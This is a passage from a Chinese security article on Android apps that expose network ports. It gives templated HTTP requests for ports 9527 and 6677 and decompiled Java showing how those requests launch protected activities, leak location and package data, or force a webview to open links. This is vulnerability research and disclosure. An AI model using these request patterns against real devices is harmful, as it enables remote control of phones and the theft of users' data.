+<p><img src="浅谈Android开放网络端口的安全风险 _ DroidSec.cn_files/2015070902353167142.png" alt="enter image description here"></p>
+<p>除了PF_INET套接字外，PF_UNIX、PF_NETLINK套接字的状态文件分别位于/proc/net/unix和/proc/net/netlink。</p>
+<p>当然，如果手机已root，可直接使用busybox安装目录下带p参数的netstat命令，可以显示pid和不完整的program name。</p>
+<p><img src="浅谈Android开放网络端口的安全风险 _ DroidSec.cn_files/2015070902353299135.png" alt="enter image description here"></p>
+<h1>0x02 漏洞挖掘实例</h1>
+<hr>
+<p>得知某个应用开放某个端口以后，接下就可以在该应用的逆向代码中搜索端口号（通常是端口号的16进制表示），重点关注ServerSocket(tcp)、DatagramSocket(udp)等类，定位到关键代码，进一步探索潜在的攻击面，下面列举一些漏洞实例。</p>
+<h2>1、敏感信息泄露、控制手机</h2>
+<p><a href="http://www.wooyun.org/bugs/wooyun-2010-094537">WooYun-2015-94537</a>：某service打开udp的65502端口监听，接收特定的命令字后可返回手机的敏感信息，包括手机助手远程管理手机的SecretKey，进而未授权的攻击者可通过网络完全管理手机。</p>
+<p><a href="http://www.securityfocus.com/archive/1/534643">CVE-2014-8757</a>, LG On-Screen Phone预装App认证绕过漏洞。</p>
+<h2>2、命令执行</h2>
+<p>这类漏洞比较常见，通常通过开放socket端口传入启动android应用组件的intent，然后以被攻击应用的权限执行启动activity、发送广播等操作。由于通过socket传入的intent，无法对发送者的身份和权限进行细粒度检查，绕过了Android提供的对应用组件的权限保护，能够启动未导出的和受权限保护的应用组件，对安全造成影响。</p>
+<p>如果监听的端口是在本地，那么可能造成本地命令执行和权限提升，而如果监听的端口是任意地址，则可能造成比较严重的远程命令执行。</p>
+<h2>3、本地命令执行：</h2>
+<p>用前面端口应用定位的方法，发现某流行应用实现了一个小型的HTTP Server，监听本地的9527端口，简单搜索分析即可发现向该端口发送如下形式的HTTP请求时可执行命令。</p><!-- Crayon Syntax Highlighter v2.7.1 -->
+
+		<div id="crayon-55a7abe4c949c248364351" class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style="margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important; height: auto;">
+		
+			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important; height: 18px !important; line-height: 18px !important; margin-top: -18px; display: none; z-index: 4;"><span class="crayon-title"></span>
+			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button crayon-pressed" title="切换是否显示行编号"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="纯文本显示代码"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="切换自动换行"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="点击展开代码" style="display: none;"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="复制代码"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="在新窗口中显示代码"><div class="crayon-button-icon"></div></div><span class="crayon-language">Java</span></div></div>
+			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
+			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly="" style="tab-size: 4; font-size: 12px !important; line-height: 15px !important; z-index: 0; opacity: 0; overflow: hidden;">http://127.0.0.1:9527/si?cmp=&lt;pacakgename&gt;_&lt;componentname&gt;&amp;data=&lt;url scheme&gt;&amp;act=&lt;action name&gt;</textarea></div>
+			<div class="crayon-main" style="position: relative; z-index: 1; overflow: hidden;">
+				<table class="crayon-table">
+					<tbody><tr class="crayon-row">
+				<td class="crayon-nums " data-settings="show">
+					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-55a7abe4c949c248364351-1">1</div></div>
+				</td>
+						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-55a7abe4c949c248364351-1"><span class="crayon-v">http</span><span class="crayon-o">:</span><span class="crayon-c">//127.0.0.1:9527/si?cmp=&lt;pacakgename&gt;_&lt;componentname&gt;&amp;data=&lt;url scheme&gt;&amp;act=&lt;action name&gt;</span></div></div></td>
+					</tr>
+				</tbody></table>
+			</div>
+		</div>
+<!-- [Format Time: 0.0029 seconds] -->
+<p>通过这个简单的HTTP请求，恶意程序就可以传入intent对象的包名、组件名、url和action，接收HTTP请求后执行命令的代码如下：</p>
+<div>
+<div id="highlighter_38903" class="syntaxhighlighter  java">
+<table border="0" cellspacing="0" cellpadding="0">
+<tbody>
+<tr>
+<td class="gutter">
+<div class="line number1 index0 alt2">1</div>
+<div class="line number2 index1 alt1">2</div>
+<div class="line number3 index2 alt2">3</div>
+<div class="line number4 index3 alt1">4</div>
+<div class="line number5 index4 alt2">5</div>
+<div class="line number6 index5 alt1">6</div>
+<div class="line number7 index6 alt2">7</div>
+<div class="line number8 index7 alt1">8</div>
+<div class="line number9 index8 alt2">9</div>
+<div class="line number10 index9 alt1">10</div>
+<div class="line number11 index10 alt2">11</div>
+<div class="line number12 index11 alt1">12</div>
+<div class="line number13 index12 alt2">13</div>
+<div class="line number14 index13 alt1">14</div>
+<div class="line number15 index14 alt2">15</div>
+<div class="line number16 index15 alt1">16</div>
+<div class="line number17 index16 alt2">17</div>
+<div class="line number18 index17 alt1">18</div>
+<div class="line number19 index18 alt2">19</div>
+<div class="line number20 index19 alt1">20</div>
+<div class="line number21 index20 alt2">21</div>
+<div class="line number22 index21 alt1">22</div>
+<div class="line number23 index22 alt2">23</div>
+<div class="line number24 index23 alt1">24</div>
+<div class="line number25 index24 alt2">25</div>
+<div class="line number26 index25 alt1">26</div>
+<div class="line number27 index26 alt2">27</div>
+<div class="line number28 index27 alt1">28</div>
+<div class="line number29 index28 alt2">29</div>
+<div class="line number30 index29 alt1">30</div>
+<div class="line number31 index30 alt2">31</div>
+<div class="line number32 index31 alt1">32</div>
+<div class="line number33 index32 alt2">33</div>
+<div class="line number34 index33 alt1">34</div>
+<div class="line number35 index34 alt2">35</div>
+<div class="line number36 index35 alt1">36</div>
+<div class="line number37 index36 alt2">37</div>
+<div class="line number38 index37 alt1">38</div>
+<div class="line number39 index38 alt2">39</div>
+<div class="line number40 index39 alt1">40</div>
+<div class="line number41 index40 alt2">41</div>
+<div class="line number42 index41 alt1">42</div>
+<div class="line number43 index42 alt2">43</div>
+<div class="line number44 index43 alt1">44</div>
+<div class="line number45 index44 alt2">45</div>
+<div class="line number46 index45 alt1">46</div>
+<div class="line number47 index46 alt2">47</div>
+<div class="line number48 index47 alt1">48</div>
+</td>
+<td class="code">
+<div class="container">
+<div class="line number1 index0 alt2"><code class="java plain">...</code></div>
+<div class="line number2 index1 alt1"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java keyword">if</code><code class="java plain">(v3.hasNext()) {</code></div>
+<div class="line number3 index2 alt2"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java plain">Object v6 = v3.next();</code></div>
+<div class="line number4 index3 alt1"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java keyword">if</code><code class="java plain">(</code><code class="java string">"act"</code><code class="java plain">.equals(v6)) {</code></div>
+<div class="line number5 index4 alt2"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java plain">v4.setAction(v10.b.get(v6));</code></div>
+<div class="line number6 index5 alt1"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java plain">}</code></div>
+<div class="line number7 index6 alt2"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java keyword">if</code><code class="java plain">(</code><code class="java string">"cmp"</code><code class="java plain">.equals(v6)) {</code></div>
+<div class="line number8 index7 alt1"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java plain">String[] v9 = v10.b.get(v6).split(</code><code class="java string">"_"</code><code class="java plain">);</code></div>
+<div class="line number9 index8 alt2"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java keyword">if</code><code class="java plain">(v9 == </code><code class="java keyword">null</code><code class="java plain">) {</code></div>
+<div class="line number10 index9 alt1"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java keyword">goto</code> <code class="java plain">label_39;</code></div>
+<div class="line number11 index10 alt2"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java plain">}</code></div>
+<div class="line number12 index11 alt1"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java keyword">if</code><code class="java plain">(v9.length != </code><code class="java value">2</code><code class="java plain">) {</code></div>
+<div class="line number13 index12 alt2"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java keyword">goto</code> <code class="java plain">label_39;</code></div>
+<div class="line number14 index13 alt1"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java plain">}</code></div>
+<div class="line number15 index14 alt2"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java plain">v4.setComponent(</code><code class="java keyword">new</code> <code class="java plain">ComponentName(v9[</code><code class="java value">0</code><code class="java plain">], v9[</code><code class="java value">1</code><code class="java plain">]));</code></div>
+<div class="line number16 index15 alt1"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java plain">}</code></div>
+<div class="line number17 index16 alt2"></div>
+<div class="line number18 index17 alt1"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java plain">label_39:</code></div>
+<div class="line number19 index18 alt2"></div>
+<div class="line number20 index19 alt1"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java keyword">if</code><code class="java plain">(</code><code class="java string">"data"</code><code class="java plain">.equals(v6)) {</code></div>
+<div class="line number21 index20 alt2"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java plain">v4.setData(Uri.parse(v10.b.get(v6)));</code></div>
+<div class="line number22 index21 alt1"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java plain">}</code></div>
+<div class="line number23 index22 alt2"></div>
+<div class="line number24 index23 alt1"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java keyword">if</code><code class="java plain">(!</code><code class="java string">"callback"</code><code class="java plain">.equals(v6)) {</code></div>
+<div class="line number25 index24 alt2"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java keyword">goto</code> <code class="java plain">label_13;</code></div>
+<div class="line number26 index25 alt1"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java plain">}</code></div>
+<div class="line number27 index26 alt2"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java plain">Object v1_1 = v10.b.get(v6);</code></div>
+<div class="line number28 index27 alt1"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java keyword">goto</code> <code class="java plain">label_13;</code></div>
+<div class="line number29 index28 alt2"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java plain">}</code></div>
+<div class="line number30 index29 alt1"></div>
+<div class="line number31 index30 alt2"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java keyword">if</code><code class="java plain">((TextUtils.isEmpty(v4.getAction())) &amp;&amp; v4.getComponent() == </code><code class="java keyword">null</code> <code class="java plain">&amp;&amp; v4.getData() == </code><code class="java keyword">null</code><code class="java plain">) {</code></div>
+<div class="line number32 index31 alt1"></div>
+<div class="line number33 index32 alt2"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java keyword">if</code><code class="java plain">(TextUtils.isEmpty(((CharSequence)v1))) {</code></div>
+<div class="line number34 index33 alt1"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java keyword">return</code> <code class="java string">"{\"result\":-20000}"</code><code class="java plain">;</code></div>
+<div class="line number35 index34 alt2"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java plain">}</code></div>
+<div class="line number36 index35 alt1"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java keyword">return</code> <code class="java keyword">this</code><code class="java plain">.a(v1, </code><code class="java string">"{\"result\":-20000}"</code><code class="java plain">);</code></div>
+<div class="line number37 index36 alt2"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java plain">}</code></div>
+<div class="line number38 index37 alt1"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java plain">List v0 = </code><code class="java keyword">this</code><code class="java plain">.a.getPackageManager().queryIntentActivities(v4, </code><code class="java value">0</code><code class="java plain">);</code></div>
+<div class="line number39 index38 alt2"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java keyword">if</code><code class="java plain">(v0.size() == </code><code class="java value">0</code><code class="java plain">) {</code></div>
+<div class="line number40 index39 alt1"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java keyword">if</code><code class="java plain">(TextUtils.isEmpty(((CharSequence)v1))) {</code></div>
+<div class="line number41 index40 alt2"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java keyword">return</code> <code class="java string">"{\"result\":-10000}"</code><code class="java plain">;</code></div>
+<div class="line number42 index41 alt1"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java plain">}</code></div>
+<div class="line number43 index42 alt2"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java keyword">return</code> <code class="java keyword">this</code><code class="java plain">.a(v1, </code><code class="java string">"{\"result\":-10000}"</code><code class="java plain">);</code></div>
+<div class="line number44 index43 alt1"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java plain">}</code></div>
+<div class="line number45 index44 alt2"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java keyword">try</code> <code class="java plain">{</code></div>
+<div class="line number46 index45 alt1"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java keyword">this</code><code class="java plain">.a.startActivity(v4);</code></div>
+<div class="line number47 index46 alt2"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java plain">}</code></div>
+<div class="line number48 index47 alt1"><code class="java plain">...</code></div>
+</div>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+</div>
+<p>最终通过HTTP请求设置的Intent对象，传入了startActivity方法，由于需要用户干预，危害并不大。但当packagename指定为该应用自身，componentname指定为该应用的activity时，可以启动该应用的任意activity，包括受保护的未导出activity，从而对安全造成影响。例如，通过HTTP请求，逐一启动若干未导出的activity，可以发现拒绝服务漏洞、对安全有影响的登录界面和有一个可以该应用权限执行任意命令的GUI shell。</p>
+<p>远程命令执行：</p>
+<ol>
+<li>趋势科技曾经发现过美团客户端漏洞，可以通过TCP的9527端口传入intent data，进而启动activity，见参考文献<code>[1]</code>.</li>
+<li>远程强制webview访问恶意链接</li>
+</ol>
+<p>定位到某流行应用实现了一个小型的HTTP Server，在tcp的6677端口监听任意地址，当HTTP请求满足一定条件时可以返回敏感信息，并根据请求消息执行一系列动作。对于该HTTP请求，仅有的防御措施是通过referer白名单的方式判断HTTP请求的来源。在正确设置referer，发送如下HTTP GET请求后</p><!-- Crayon Syntax Highlighter v2.7.1 -->
+
+		<div id="crayon-55a7abe4c94f7510696337" class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style="margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important; height: auto;">
+		
+			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important; height: 18px !important; line-height: 18px !important; margin-top: -18px; display: none; z-index: 4;"><span class="crayon-title"></span>
+			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button crayon-pressed" title="切换是否显示行编号"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="纯文本显示代码"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="切换自动换行"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="点击展开代码" style="display: none;"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="复制代码"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="在新窗口中显示代码"><div class="crayon-button-icon"></div></div><span class="crayon-language">Java</span></div></div>
+			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
+			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly="" style="tab-size: 4; font-size: 12px !important; line-height: 15px !important; z-index: 0; opacity: 0; overflow: hidden;">http://ip:6677/command?param1=value1&amp;...&amp;paramn=valuen</textarea></div>
+			<div class="crayon-main" style="position: relative; z-index: 1; overflow: hidden;">
+				<table class="crayon-table">
+					<tbody><tr class="crayon-row">
+				<td class="crayon-nums " data-settings="show">
+					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-55a7abe4c94f7510696337-1">1</div></div>
+				</td>
+						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-55a7abe4c94f7510696337-1"><span class="crayon-v">http</span><span class="crayon-o">:</span><span class="crayon-c">//ip:6677/command?param1=value1&amp;...&amp;paramn=valuen</span></div></div></td>
+					</tr>
+				</tbody></table>
+			</div>
+		</div>
+<!-- [Format Time: 0.0006 seconds] -->
+<p>可获取手机的敏感信息和实现命令执行。其中command为getpackageinfo、androidamap、geolocation中的其一，见如下代码片段。</p>
+<p><img src="浅谈Android开放网络端口的安全风险 _ DroidSec.cn_files/2015070902353258460.png" alt="enter image description here"></p>
+<p>（1）当command为geolocation时，可返回安装该应用手机地理位置信息；</p>
+<p>（2）当command为getpackageinfo时，默认返回该应用自身的版本信息。此时若指定参数param1为packagename,即请求http://ip:6677/getpackageinfo?packagename=xxx时（xxx为软件包名）可返回手机上安装的xxx所指定的任意软件包版本信息。若xxx为android，可返回android系统版本信息；</p>
+<p>（3）当command为androidamap时，设置Intent并将其广播出去，查看对应的OnReceive方法</p>
+<p><img src="浅谈Android开放网络端口的安全风险 _ DroidSec.cn_files/2015070902353353500.png" alt="enter image description here"></p>
+<p>发现需要指定参数param1为action,即请求</p><!-- Crayon Syntax Highlighter v2.7.1 -->
+
+		<div id="crayon-55a7abe4c950e275194313" class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style="margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important; height: auto;">
+		
+			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important; height: 18px !important; line-height: 18px !important; margin-top: -18px; display: none; z-index: 4;"><span class="crayon-title"></span>
+			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button crayon-pressed" title="切换是否显示行编号"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="纯文本显示代码"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="切换自动换行"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="点击展开代码" style="display: none;"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="复制代码"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="在新窗口中显示代码"><div class="crayon-button-icon"></div></div><span class="crayon-language">Java</span></div></div>
+			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
+			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly="" style="tab-size: 4; font-size: 12px !important; line-height: 15px !important; z-index: 0; opacity: 0; overflow: hidden;">http://ip:6677/androidamap?action=yyy&amp;param2=value2&amp;...&amp;paramn=valuen</textarea></div>
+			<div class="crayon-main" style="position: relative; z-index: 1; overflow: hidden;">
+				<table class="crayon-table">
+					<tbody><tr class="crayon-row">
+				<td class="crayon-nums " data-settings="show">
+					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-55a7abe4c950e275194313-1">1</div></div>
+				</td>
+						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-55a7abe4c950e275194313-1"><span class="crayon-v">http</span><span class="crayon-o">:</span><span class="crayon-c">//ip:6677/androidamap?action=yyy&amp;param2=value2&amp;...&amp;paramn=valuen</span></div></div></td>
+					</tr>
+				</tbody></table>
+			</div>
+		</div>
+<!-- [Format Time: 0.0006 seconds] -->
+<p>时，OnReceive方法取出前面广播intent对象的extra，新建一个intent对象，设置intent uri为</p><!-- Crayon Syntax Highlighter v2.7.1 -->
+
+		<div id="crayon-55a7abe4c9515999731991" class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style="margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important; height: auto;">
+		
+			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important; height: 18px !important; line-height: 18px !important; margin-top: -18px; display: none; z-index: 4;"><span class="crayon-title"></span>
+			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button crayon-pressed" title="切换是否显示行编号"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="纯文本显示代码"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="切换自动换行"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="点击展开代码" style="display: none;"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="复制代码"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="在新窗口中显示代码"><div class="crayon-button-icon"></div></div><span class="crayon-language">Java</span></div></div>
+			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
+			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly="" style="tab-size: 4; font-size: 12px !important; line-height: 15px !important; z-index: 0; opacity: 0; overflow: hidden;">androidamap://yyy?sourceApplication=web&amp;param2=value2&amp;...&amp;paramn=valuen</textarea></div>
+			<div class="crayon-main" style="position: relative; z-index: 1; overflow: hidden;">
+				<table class="crayon-table">
+					<tbody><tr class="crayon-row">
+				<td class="crayon-nums " data-settings="show">
+					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-55a7abe4c9515999731991-1">1</div></div>
+				</td>
+						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-55a7abe4c9515999731991-1"><span class="crayon-v">androidamap</span><span class="crayon-o">:</span><span class="crayon-c">//yyy?sourceApplication=web&amp;param2=value2&amp;...&amp;paramn=valuen</span></div></div></td>
+					</tr>
+				</tbody></table>
+			</div>
+		</div>
+<!-- [Format Time: 0.0009 seconds] -->
+<p>并以隐式intent的形式启动注册这种uri scheme的activiy。</p>
+<p>进一步搜索发现如下代码：</p>
+<div>
+<div id="highlighter_378397" class="syntaxhighlighter  java">
+<table border="0" cellspacing="0" cellpadding="0">
+<tbody>
+<tr>
+<td class="gutter">
+<div class="line number1 index0 alt2">1</div>
+<div class="line number2 index1 alt1">2</div>
+<div class="line number3 index2 alt2">3</div>
+<div class="line number4 index3 alt1">4</div>
+<div class="line number5 index4 alt2">5</div>
+<div class="line number6 index5 alt1">6</div>
+<div class="line number7 index6 alt2">7</div>
+</td>
+<td class="code">
+<div class="container">
+<div class="line number1 index0 alt2"><code class="java plain">Uri v0_2 = Uri.parse(</code><code class="java string">"androidamap://openFeature?featureName=OpenURL&amp;sourceApplication=banner&amp;urlType=0&amp;contentType=autonavi&amp;url="</code></div>
+<div class="line number2 index1 alt1"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java plain">+ </code><code class="java keyword">this</code><code class="java plain">.a.m.privilegeLink);</code></div>
+<div class="line number3 index2 alt2"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java plain">Intent v1 = </code><code class="java keyword">new</code> <code class="java plain">Intent(MovieDetailHeaderView.c(</code><code class="java keyword">this</code><code class="java plain">.a).getApplicationContext(), </code></div>
